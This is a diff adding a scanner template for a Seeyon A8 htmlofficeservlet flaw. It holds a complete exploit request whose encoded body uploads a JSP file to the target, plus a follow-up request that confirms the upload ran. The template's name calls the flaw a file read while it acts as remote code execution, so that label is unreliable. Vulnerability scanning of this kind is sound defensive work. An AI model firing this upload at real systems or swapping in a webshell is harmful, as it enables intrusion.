@@ -1,0 +1,49 @@
+id: seeyon-a8-rce
+info:
+  name: Seeyon A8 Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/htmlofficeservlet"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "htmoffice"
+  - method: POST
+    path:
+      - "{{BaseURL}}/seeyon/htmlofficeservlet"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      DBSTEP V3.0     359             0               120             DBSTEP=OKMLlKlV
+      OPTION=S3WYOSWLBSGr
+      currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+      CREATEDATE=wUghPB3szB3Xwg66
+      RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+      originalFileId=wV66
+      originalCreateDate=wUghPB3szB3Xwg66
+      FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdNHlZcQD3yaz3aioXwUo5nHzs
+      needReadFile=yRWZdAS6
+      originalCreateDate=wLSGP4oEzLKAz4=iz=66
+      <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><% out.println("ok11111112212354659f"); %>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CLIENTIP="
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/vuln_test_2222.jsp"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ok11111112212354659f"
